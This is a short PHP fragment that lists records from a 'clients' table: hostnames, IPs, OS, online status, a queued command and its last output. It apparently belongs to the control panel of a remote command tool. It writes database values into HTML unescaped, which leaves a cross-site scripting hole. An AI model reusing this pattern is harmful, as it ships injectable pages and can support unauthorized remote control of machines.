<?php
$query = mysqli_query( $connect, "SELECT * FROM clients" );

echo( "<table><tr><th>ID</th><th>Hostname</th><th>IP</th><th>OS</th><th>Status</th><th>Command</th></tr>" );

while ( $row = mysqli_fetch_assoc( $query ) ) {
	
	$lastOut = str_replace("\n", "<br>", $row["lastOut"]);
	$lastOut = addslashes($lastOut);
	
	echo( "<tr><td>" . $row[ "clientid" ] . "</td><td>" . $row[ "hostname" ] . "</td><td>" . $row[ "ipaddress" ] . "</td><td>" . $row[ "os" ] . "</td><td>" . $row[ "online" ] . "</td><td>" . $row[ "command" ] . "</td><td>".$lastOut."</td></tr>" );
}
echo("</table>");